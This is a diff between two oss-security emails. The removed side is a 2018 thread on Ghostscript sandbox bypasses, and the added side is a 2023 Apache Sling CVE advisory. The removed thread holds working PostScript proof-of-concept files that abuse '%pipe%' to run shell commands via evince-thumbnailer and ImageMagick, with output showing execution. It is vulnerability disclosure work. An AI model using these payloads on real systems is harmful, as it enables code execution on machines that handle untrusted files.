@@ -1,9 +1,4 @@
-X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["5626" "Wednesday" "22" "August" "2018" "21:24:36" "-0700" "Tavis Ormandy" "taviso@google.com" "<CAJ_zFkL5Tus9-4PJOTPGNwg0BVCd+NkgC9B_HM9ev+UTAS=59Q@mail.gmail.com>" "163" "Re: [oss-security] Re: More Ghostscript Issues: Should we disable PS coders in policy.xml by default?" "^Date:" nil nil "8" "2018082304:24:36" "[oss-security] Re: More Ghostscript Issues: Should we disable PS coders in policy.xml by default?" (number mark "        taviso@googl Aug 22  163/5626  " thread-indent "\"Re: [oss-security] Re: More Ghostscript Issues: Should we disable PS coders in policy.xml by default?\"\n") "<CAJ_zFkJ-qq_SRuiif-mUZmURpTgHrmwx0cp_gM3ms_-TwNVODQ@mail.gmail.com>" ("<CAJ_zFk+ZNi8r8TKTZuaYgSBUz4mxCO7C5SC=B8Ktc_CZQW6Dsw@mail.gmail.com>" "<CAJ_zFk+RtYrqWQ4Mj1SLVJ7BTZBHLjo_M9t-gDVS_uDEPhuCrg@mail.gmail.com>" "<alpine.GSO.2.20.1808210951110.18862@scrappy.simplesystems.org>" "<CAFRnB2U+QMGmAMoZqbCgTjEx_o_NA+Y9eBE6eDBgJJ0hZdQ4GQ@mail.gmail.com>" "<CAJ_zFkJpnGtG6D3JZVaC5KJiNzsJ6vjJK0oXRfirR8QsdFbZVQ@mail.gmail.com>" "<CAOVKCF0Qehz2q3m2vPSAr3vKRAxdHrTbnyk71ApFYnVXuZ-P6Q@mail.gmail.com>" "<CAJ_zFkJ-qq_SRuiif-mUZmURpTgHrmwx0cp_gM3ms_-TwNVODQ@mail.gmail.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	nil)
-X-Mozilla-Status: 0001
-X-Mozilla-Status2: 00000000
-Received: (qmail 30010 invoked by uid 550); 23 Aug 2018 04:24:59 -0000
+Received: (qmail 11968 invoked by uid 550); 23 Feb 2023 09:39:56 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,210 +6,44 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 29988 invoked from network); 23 Aug 2018 04:24:58 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=google.com; s=20161025;
-        h=mime-version:references:in-reply-to:from:date:message-id:subject:to;
-        bh=0FaymDHUFyxPpGiQxo7bT759F8vy1/7slPi45Qur33U=;
-        b=bYOXZRR13WIV0uwaqiWEfkBDxB+KOyNaVKj4pzpFlWZaKG4LwmNEFyIjX7rY39pEFp
-         T2sncoa4h7tLUad4OwnvmS6gYEThGdBIahtMv6FnpBvf1GUIxepaGA2WECKz2ZTzWHm+
-         6bmeGleYcTsBJbamSeSjnnifJnD8zJRORBMO95J9u/JmMdDtHNmvAVQxqeIXv9eO9ySj
-         u+SIDLJABfEk1/c9P/0U8ypFlWPkv8MgExEhoURKBRUYx0zVqhftG7oUuX2p5059QrNX
-         M2hQCIwvbp8E63lr354y8cl0LuIWZjuseJw3NPKe4940IyJrl01Trpj/BzvzgdZb+x1A
-         M9ug==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20161025;
-        h=x-gm-message-state:mime-version:references:in-reply-to:from:date
-         :message-id:subject:to;
-        bh=0FaymDHUFyxPpGiQxo7bT759F8vy1/7slPi45Qur33U=;
-        b=hnrRVztlQdr2msvrjZPUo9M3p3CpvksqhwamKQ4dXqTIKDONnvv9Z2wwyjAzLgQ1oI
-         3JWUZT03GvCxiKuv3yr9y8qsdthJx5KoLyv9ESBo1S4KzQvQr0pDAaVt14ZKlUcsatbm
-         kGG45Ebw3tme70q1TVS4hFsT4eSXRZU7T9PvuDjOEVA2lXzXlSZxXSbqSLjv3WPlWDm1
-         zVFMOMfc70qLBva9O9oqWVUErVpCYNyPcsbLERLHvUDLWa5SmcFOVePggKgWEiNU7qXu
-         zt8Xq+sXuevAR9eIyoIV+6POzFVTQqnc3tLwpuoW6Y71WUXgUjqNdfr5AKq5q7YwVvYv
-         8YBw==
-X-Gm-Message-State: APzg51CgblOR06ZN7YI/ZAlD77kA7x6klMYp6jsjYr0yhhEbvMPjzJ3I
-	mTRwiNZSe/BqyfUbjCJhAk0H1G1EiMiWDCQtar8jDTHpF2c=
-X-Google-Smtp-Source: ANB0VdYw/kM8it43d9zLGuh7hvw/UCBiaAl8n+vt093jCMBFkRJjHRVgj3LUPRCqAK8XwbzOpmotiXVjRtC2dNsA+Nw=
-X-Received: by 2002:a37:1118:: with SMTP id b24-v6mr1054814qkh.253.1534998285913;
- Wed, 22 Aug 2018 21:24:45 -0700 (PDT)
-MIME-Version: 1.0
-References: <CAJ_zFk+ZNi8r8TKTZuaYgSBUz4mxCO7C5SC=B8Ktc_CZQW6Dsw@mail.gmail.com>
- <CAJ_zFk+RtYrqWQ4Mj1SLVJ7BTZBHLjo_M9t-gDVS_uDEPhuCrg@mail.gmail.com>
- <alpine.GSO.2.20.1808210951110.18862@scrappy.simplesystems.org>
- <CAFRnB2U+QMGmAMoZqbCgTjEx_o_NA+Y9eBE6eDBgJJ0hZdQ4GQ@mail.gmail.com>
- <CAJ_zFkJpnGtG6D3JZVaC5KJiNzsJ6vjJK0oXRfirR8QsdFbZVQ@mail.gmail.com>
- <CAOVKCF0Qehz2q3m2vPSAr3vKRAxdHrTbnyk71ApFYnVXuZ-P6Q@mail.gmail.com> <CAJ_zFkJ-qq_SRuiif-mUZmURpTgHrmwx0cp_gM3ms_-TwNVODQ@mail.gmail.com>
-In-Reply-To: <CAJ_zFkJ-qq_SRuiif-mUZmURpTgHrmwx0cp_gM3ms_-TwNVODQ@mail.gmail.com>
-Message-ID: <CAJ_zFkL5Tus9-4PJOTPGNwg0BVCd+NkgC9B_HM9ev+UTAS=59Q@mail.gmail.com>
-Content-Type: multipart/alternative; boundary="00000000000090bc2b057412a3e9"
-Date: Wed, 22 Aug 2018 21:24:36 -0700
-From: Tavis Ormandy <taviso@google.com>
 Reply-To: oss-security@lists.openwall.com
-Subject: Re: [oss-security] Re: More Ghostscript Issues: Should we disable PS
- coders in policy.xml by default?
+Received: (qmail 30647 invoked from network); 23 Feb 2023 08:41:14 -0000
+Authentication-Results: apache.org; auth=none
+Content-Type: text/plain; charset=utf-8
+From: Carsten Ziegeler <cziegeler@apache.org>
 To: oss-security@lists.openwall.com
+Message-ID: <7e538c37-50f5-0c58-3e2d-b44a8f37b5c3@apache.org>
+Content-Transfer-Encoding: quoted-printable
+Date: Thu, 23 Feb 2023 08:40:58 +0000
+MIME-Version: 1.0
+Subject: [oss-security] CVE-2023-25621: Apache Sling does not allow to handle i18n content
+ in a secure way 
 
---00000000000090bc2b057412a3e9
-Content-Type: text/plain; charset="UTF-8"
+Severity: important
 
-I've verified that on centos7 at least, just opening nautilus on Downloads
-is enough to trigger code execution via evince-thumbnailer.
+Description:
 
-I just called it test.tiff and used <a download href=test.tiff> in Chrome,
-opening nautilus executed the command immediately.
+Privilege Escalation vulnerability in Apache Software Foundation Apache Sli=
+ng.
+Any content author is able to create i18n dictionaries in the repository in=
+ a location the author has write access to. As these translations are used =
+across the whole product, it allows an author to change any text or dialog =
+in the product. For example an attacker might fool someone by changing the =
+text on a delete button to "Info".
+This issue affects the i18n module of Apache Sling up to version 2.5.18. Ve=
+rsion 2.6.2 and higher limit by default i18m dictionaries to certain paths =
+in the repository (/libs and /apps).
 
-I think we should kill (or at least trim the mime types)
-in /usr/share/thumbnailers/evince.thumbnailer.
+Users of the module are advised to update to version 2.6.2 or higher, check=
+ the configuration for resource loading and then adjust the access permissi=
+ons for the configured path accordingly.
 
-Tavis.
+This issue is being tracked as SLING-11744=20
 
-On Wed, Aug 22, 2018 at 5:35 PM Tavis Ormandy <taviso@google.com> wrote:
+References:
 
-> Thanks Amit, that's scary, it looks like they're working on it right now.
->
-> FWIW, I figured out how to reproduce the original bug here in
-> evince-thumbnailer:
->
-> $ cat test.jpeg
-> %!PS
-> a0
-> { null restore } stopped { pop } if
-> (ppmraw) selectdevice
-> legal
-> mark /OutputFile (%pipe%id) currentdevice putdeviceprops
-> showpage
-> $ strace -q -feexecve evince-thumbnailer  test.jpeg foo.out
-> execve("/usr/bin/evince-thumbnailer", ["evince-thumbnailer", "test.jpeg",
-> "foo.out"], 0x7ffeed3010d0 /* 65 vars */) = 0
-> execve("/bin/sh", ["sh", "-c", "id"], 0x7ffcf3ea8d18 /* 65 vars */) = 0
->
-> Tavis.
->
-> On Wed, Aug 22, 2018 at 12:30 PM AmitB <me@amitbl.com> wrote:
->
->> I also took a look a copule weeks ago at few of the patches for your
->> previous bugs from 2 years ago, and found that one of them is incomplete
->> and still allowing RCE (
->> https://bugs.ghostscript.com/show_bug.cgi?id=697178)
->>
->> POC:
->> ------------------
->> $ cat poc.jpg
->> %!PS
->> << (ICCProfilesDir) (%pipe%id > /dev/) >> .setuserparams
->> currentdevice null true mark /OutputICCProfile (tty)
->> .putdeviceparams
->> showpage
->> $ identify poc.jpg
->> uid=1000(amit) gid=1000(amit) groups=1000(amit)
->>
->> After reviewing all of the comments in the original bug report I saw that
->> you actually mentioned this issue, but it was not taken under
->> consideration/forgotten for some reason.
->> So effectively a public RCE PoC has been avaliable for GhostScript for
->> almost 2 years.
->>
->> I opened a report two weeks ago at bugs.ghostscript.com:
->> 699623 Incomplete fix for #697178 Allowing -dSAFER bypass
->>
->> But I got no response from them until today.
->> If you have others channels of contact with them please let them know
->> about
->> this one too.
->>
->> On Tue, Aug 21, 2018 at 11:12 PM, Tavis Ormandy <taviso@google.com>
->> wrote:
->>
->> > Thanks Alex.
->> >
->> > FWIW, not all of these are visible, but I've started filing bugs, I'll
->> file
->> > a few more today and then let the developers work through the most
->> serious
->> > ones.
->> >
->> > 699654 /invalidaccess checks stop working after a failed restore
->> > 699655 missing type checking in setcolor
->> > 699656 LockDistillerParams boolean missing type checks
->> > 699659 missing type check in type checker (!)
->> > 699657 .tempfile SAFER restrictions seem to be broken
->> > 699658 Bypassing PermitFileReading by handling undefinedfilename error
->> > 699660 shading_param incomplete type checking
->> > 699661 pdf14 garbage collection memory corruption
->> > 699662 calling .bindnow causes sideeffects
->> > 699663 .setdistillerkeys memory corruption
->> > 699664 corrupt device object after error in job
->> >
->> > I'm working on getting reproducers working for the developers for all
->> bugs.
->> >
->> > On Tue, Aug 21, 2018 at 8:22 AM Alex Gaynor <alex.gaynor@gmail.com>
->> wrote:
->> >
->> > > A small note. Both ImageMagick and GraphicsMagick process various file
->> > > formats that can nest a different image file inside of them. These are
->> > very
->> > > frequently implemented with a call to ReadImage(), with no checking
->> that
->> > > it's the expected file format. (As a result, the fuzzer finds various
->> > > impressive chains, with sometimes 3 different image formats nested
->> inside
->> > > of each other).
->> > >
->> > > The conclusion of this is that people _must not_ attempt to do their
->> own
->> > > format detection and then pass the data to IM/GM, because this can be
->> > > bypassed with nested formats. It's imperative that GS truly be
->> disabled
->> > > with either policy.xml or by uninstall GS.
->> > >
->> > > Alex
->> > >
->> > > On Tue, Aug 21, 2018 at 11:01 AM Bob Friesenhahn <
->> > > bfriesen@simple.dallas.tx.us> wrote:
->> > >
->> > > > On Tue, 21 Aug 2018, Tavis Ormandy wrote:
->> > > > >
->> > > > > I think those thumbnails should be disabled, but you've probably
->> > > noticed
->> > > > I
->> > > > > think everything related to untrusted ghostscript should be
->> disabled
->> > > :-)
->> > > >
->> > > > I have posted to the GraphicsMagick Announcements mailing list
->> > > > regarding your findings (with a link to this list) and suggested
->> that
->> > > > a fool-proof solution is that Ghostscript should be uninstalled.
->> > > >
->> > > > Uninstalling Ghostscript entirely might cause software using libgs
->> to
->> > > > not execute at all unless a stub library is put in its place.
->> > > >
->> > > > Dependencies on Ghostscript are much larger than one would initially
->> > > > think due to Postscript being the traditional output from Unix
->> > > > software for "printing" and thus it is used as an intermediate
->> format
->> > > > in order to convert between formats.  EPS content is also embedded
->> in
->> > > > some other formats.
->> > > >
->> > > > Bob
->> > > > --
->> > > > Bob Friesenhahn
->> > > > bfriesen@simple.dallas.tx.us,
->> > > http://www.simplesystems.org/users/bfriesen/
->> > > > GraphicsMagick Maintainer,    http://www.GraphicsMagick.org/
->> > > >
->> > >
->> > >
->> > > --
->> > > All that is necessary for evil to succeed is for good people to do
->> > nothing.
->> > >
->> >
->>
->
+https://sling.apache.org/news.html
+https://sling.apache.org/
+https://www.cve.org/CVERecord?id=3DCVE-2023-25621
+https://issues.apache.org/jira/browse/SLING-11744
 
---00000000000090bc2b057412a3e9--
